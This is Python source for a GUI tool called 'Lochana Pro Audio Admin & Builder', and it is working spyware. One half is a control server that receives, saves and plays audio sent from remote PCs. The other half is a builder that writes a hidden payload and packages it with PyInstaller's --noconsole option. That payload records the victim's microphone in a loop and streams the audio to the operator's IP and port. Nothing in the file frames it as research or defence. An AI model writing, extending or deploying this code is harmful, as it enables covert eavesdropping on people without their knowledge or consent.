import sys, socket, threading, wave, os, time, pygame, subprocess, json
from PyQt6.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, 
                             QLabel, QWidget, QListWidget, QTabWidget, QGridLayout, 
                             QScrollArea, QFrame, QHBoxLayout, QLineEdit, QMessageBox, QCheckBox)
from PyQt6.QtCore import pyqtSignal, QObject, Qt

# --- Configuration Management ---
CONFIG_FILE = "settings.json"

def save_settings(ip, port, auto_rec):
    with open(CONFIG_FILE, "w") as f:
        json.dump({"ip": ip, "port": port, "auto_rec": auto_rec}, f)

def load_settings():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except: pass
    return {"ip": "0.0.0.0", "port": "8080", "auto_rec": False}

class ServerSignals(QObject):
    update_ui = pyqtSignal(dict)
    update_dash_log = pyqtSignal(str)
    update_build_log = pyqtSignal(str)
    build_done = pyqtSignal(str)

class ClientCard(QFrame):
    def __init__(self, ip, hostname, auto_start_rec=False):
        super().__init__()
        self.ip, self.hostname = ip, hostname
        self.is_recording = auto_start_rec
        self.is_live = False
        self.setup_ui()

    def setup_ui(self):
        self.setMinimumHeight(300)
        self.setStyleSheet("background-color: #2c3e50; border-radius: 15px; padding: 20px; margin: 10px; border: 1px solid #34495e;")
        layout = QVBoxLayout(self)
        
        icon_lbl = QLabel("💻")
        icon_lbl.setStyleSheet("font-size: 50px; border: none;")
        icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

        name_lbl = QLabel(f"{self.hostname}\n{self.ip}")
        name_lbl.setStyleSheet("font-weight: bold; color: white; font-size: 14px; border: none;")
        name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.btn_rec = QPushButton()
        self.btn_live = QPushButton()

        layout.addWidget(icon_lbl); layout.addStretch(); layout.addWidget(name_lbl)
        layout.addSpacing(15); layout.addWidget(self.btn_rec); layout.addWidget(self.btn_live)
        
        self.btn_rec.clicked.connect(self.toggle_rec)
        self.btn_live.clicked.connect(self.toggle_live)
        self.update_styles()

    def toggle_rec(self):
        self.is_recording = not self.is_recording
        self.update_styles()

    def toggle_live(self):
        self.is_live = not self.is_live
        self.update_styles()

    def update_styles(self):
        self.btn_rec.setText(f"REC: {'ON' if self.is_recording else 'OFF'}")
        self.btn_rec.setStyleSheet(f"background-color: {'#e74c3c' if self.is_recording else '#34495e'}; color: white; padding: 10px; font-weight: bold; border-radius: 8px;")
        self.btn_live.setText(f"LIVE: {'ON' if self.is_live else 'OFF'}")
        self.btn_live.setStyleSheet(f"background-color: {'#27ae60' if self.is_live else '#34495e'}; color: white; padding: 10px; font-weight: bold; border-radius: 8px;")

class MainSystem(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Lochana Pro Audio Admin & Builder v3.1")
        self.resize(1100, 750)
        self.client_widgets = {}
        self.running = True
        self.signals = ServerSignals()
        pygame.mixer.init()
        
        self.setup_ui()
        threading.Thread(target=self.start_server, daemon=True).start()

    def setup_ui(self):
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        # --- Dashboard Tab ---
        dash_widget = QWidget(); dash_layout = QHBoxLayout(dash_widget)
        self.grid_layout = QGridLayout(); scroll_widget = QWidget(); scroll_widget.setLayout(self.grid_layout)
        scroll = QScrollArea(); scroll.setWidgetResizable(True); scroll.setStyleSheet("border: none; background-color: transparent;")
        scroll.setWidget(scroll_widget)
        
        dash_log_panel = QVBoxLayout()
        conf = load_settings()
        
        self.check_auto_rec = QCheckBox("Auto-Record New Connections")
        self.check_auto_rec.setChecked(conf.get('auto_rec', False))
        self.check_auto_rec.setStyleSheet("color: #e74c3c; font-weight: bold; font-size: 13px; margin-bottom: 10px;")
        self.check_auto_rec.stateChanged.connect(self.log_auto_rec_status)
        
        dash_log_panel.addWidget(self.check_auto_rec)
        dash_log_panel.addWidget(QLabel("SYSTEM ACTIVITY LOG"))
        self.dash_log_list = QListWidget()
        self.dash_log_list.setStyleSheet("background-color: #121212; color: #00ff00; border: 1px solid #333; border-radius: 8px; font-family: Consolas; font-size: 11px;")
        dash_log_panel.addWidget(self.dash_log_list)
        
        dash_layout.addWidget(scroll, 70); dash_layout.addLayout(dash_log_panel, 30)

        # --- Settings & Builder Tab ---
        settings_widget = QWidget(); settings_layout = QVBoxLayout(settings_widget)
        settings_layout.setContentsMargins(100, 50, 100, 50); settings_layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        self.ip_input = QLineEdit(conf['ip']); self.port_input = QLineEdit(conf['port'])
        btn_save = QPushButton("💾 SAVE SETTINGS"); btn_save.clicked.connect(self.save_conf)
        self.btn_build = QPushButton("🔨 GENERATE OPTIMIZED PAYLOAD"); self.btn_build.clicked.connect(self.build_exe)

        input_style = "background-color: #333; color: white; padding: 12px; border-radius: 5px; margin-bottom: 10px;"
        self.ip_input.setStyleSheet(input_style); self.port_input.setStyleSheet(input_style)
        btn_save.setStyleSheet("background-color: #f39c12; color: white; height: 45px; font-weight: bold; border-radius: 5px;")
        self.btn_build.setStyleSheet("background-color: #2980b9; color: white; height: 65px; font-weight: bold; margin-top: 30px; border-radius: 10px;")

        settings_layout.addWidget(QLabel("YOUR ZEROTIER IP:")); settings_layout.addWidget(self.ip_input)
        settings_layout.addWidget(QLabel("LISTEN PORT:")); settings_layout.addWidget(self.port_input)
        settings_layout.addWidget(btn_save); settings_layout.addWidget(self.btn_build)
        
        self.build_log_list = QListWidget(); self.build_log_list.setFixedHeight(180)
        self.build_log_list.setStyleSheet("background-color: #121212; color: #3498db; border: 1px solid #333; border-radius: 8px; font-family: Consolas; font-size: 11px;")
        settings_layout.addSpacing(20); settings_layout.addWidget(QLabel("BUILDER PROGRESS LOG")); settings_layout.addWidget(self.build_log_list)

        self.tabs.addTab(dash_widget, "Dashboard"); self.tabs.addTab(settings_widget, "Settings & Builder")
        self.setStyleSheet("background-color: #1a1a1a; color: white; font-family: Segoe UI;")
        
        self.signals.update_ui.connect(self.add_client)
        self.signals.update_dash_log.connect(lambda msg: self.dash_log_list.insertItem(0, f"[{time.strftime('%H:%M:%S')}] {msg}"))
        self.signals.update_build_log.connect(lambda msg: self.build_log_list.insertItem(0, f"[{time.strftime('%H:%M:%S')}] {msg}"))
        self.signals.build_done.connect(self.on_build_done)

    def log_auto_rec_status(self):
        status = "ENABLED" if self.check_auto_rec.isChecked() else "DISABLED"
        self.signals.update_dash_log.emit(f"Auto-Record Mode: {status}")

    def save_conf(self):
        save_settings(self.ip_input.text(), self.port_input.text(), self.check_auto_rec.isChecked())
        QMessageBox.information(self, "Success", "Settings saved! Restart the app to bind to new port.")

    def add_client(self, info):
        ip = info['ip']
        if ip not in self.client_widgets:
            card = ClientCard(ip, info['hostname'], auto_start_rec=self.check_auto_rec.isChecked())
            self.client_widgets[ip] = card
            idx = self.grid_layout.count()
            self.grid_layout.addWidget(card, idx // 3, idx % 3)
            self.signals.update_dash_log.emit(f"New PC Online: {ip}")

    def start_server(self):
        if not os.path.exists("recordings"): os.makedirs("recordings")
        conf = load_settings()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                # 0.0.0.0 binds to all interfaces including ZeroTier
                s.bind(('0.0.0.0', int(conf['port'])))
                s.listen(10)
                while self.running:
                    s.settimeout(1.0)
                    try:
                        conn, addr = s.accept()
                        self.signals.update_ui.emit({'ip': addr[0], 'hostname': f"PC-{addr[0].split('.')[-1]}"})
                        threading.Thread(target=self.handle_client, args=(conn, addr[0]), daemon=True).start()
                    except socket.timeout: continue
        except Exception as e: self.signals.update_dash_log.emit(f"SERVER ERROR: {e}")

    def handle_client(self, conn, ip):
        with conn:
            data = b''
            while self.running:
                try:
                    chunk = conn.recv(32768)
                    if not chunk: break
                    data += chunk
                except: break
            
            if data and ip in self.client_widgets:
                card = self.client_widgets[ip]
                # සේව් කරන්න කලින් ෆෝල්ඩර් එක හදමු
                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                fld = f"recordings/{ip.replace('.', '_')}"
                if not os.path.exists(fld): os.makedirs(fld)

                if card.is_recording:
                    path = f"{fld}/audio_{timestamp}.wav"
                    self.save_wav(path, data)
                    self.signals.update_dash_log.emit(f"Saved recording from {ip}")

                if card.is_live:
                    tmp = f"live_temp.wav"
                    self.save_wav(tmp, data)
                    pygame.mixer.music.load(tmp)
                    pygame.mixer.music.play()

    def save_wav(self, name, data):
        try:
            with wave.open(name, 'wb') as wf:
                wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100); wf.writeframes(data)
        except: pass

    def build_exe(self):
        ip, port = self.ip_input.text(), self.port_input.text()
        self.btn_build.setEnabled(False)
        self.signals.update_build_log.emit("🔨 Building payload with retry logic...")
        
        def run_build():
            # Payload with Hardware-check and Retry logic
            src = f"""import socket, sounddevice as sd, time, numpy as np
def r():
    FS = 44100
    while True:
        try:
            # Mic detection
            rec = sd.rec(int(10 * FS), samplerate=FS, channels=1, dtype='int16')
            sd.wait()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect(('{ip}', {port}))
                s.sendall(rec.tobytes())
        except Exception as e:
            time.sleep(10) # Wait and retry if connection or mic fails
r()"""
            with open("temp_p.py", "w") as f: f.write(src)
            try:
                # --clean helps to avoid old cache issues
                subprocess.check_call(["pyinstaller", "--noconsole", "--onefile", "--clean", "temp_p.py"])
                self.signals.build_done.emit("ok")
            except: self.signals.build_done.emit("err")
            finally:
                if os.path.exists("temp_p.py"): os.remove("temp_p.py")

        threading.Thread(target=run_build, daemon=True).start()

    def on_build_done(self, status):
        self.btn_build.setEnabled(True)
        if status == "ok":
            self.signals.update_build_log.emit("✅ BUILD COMPLETE: Check 'dist' folder.")
            os.startfile(os.path.join(os.getcwd(), "dist"))
        else:
            self.signals.update_build_log.emit("❌ BUILD FAILED: Check PyInstaller installation.")

    def closeEvent(self, event):
        self.running = False; pygame.mixer.quit(); event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv); win = MainSystem(); win.show(); sys.exit(app.exec())